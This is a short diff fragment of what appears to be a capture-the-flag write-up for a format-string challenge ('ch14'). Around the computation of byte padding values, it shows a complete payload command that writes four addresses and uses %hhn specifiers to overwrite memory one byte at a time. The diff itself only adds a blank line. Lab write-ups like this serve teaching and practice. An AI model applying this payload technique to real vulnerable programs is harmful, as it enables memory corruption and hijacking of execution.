@@ -75,6 +75,7 @@ Output:
  - We already have 685 bytes above, to get the right value of first byte. We pad more **990 - 685 = 305**
 
 Here's the layout of what we've done until now: 
+
 ![image](https://user-images.githubusercontent.com/48288606/146911826-3d6f1aa6-cec3-4516-83da-dbaae0f18105.png)
 
 Payload: `./ch14 $(python -c "print('\x98\xfa\xff\xbf' + '\x99\xfa\xff\xbf' + '\x9a\xfa\xff\xbf' + '\x9b\xfa\xff\xbf' + '%223d%9\$hhn' + '%207d%10\$hhn' + '%239d%11\$hhn' + '%305d%12\$hhn')")`
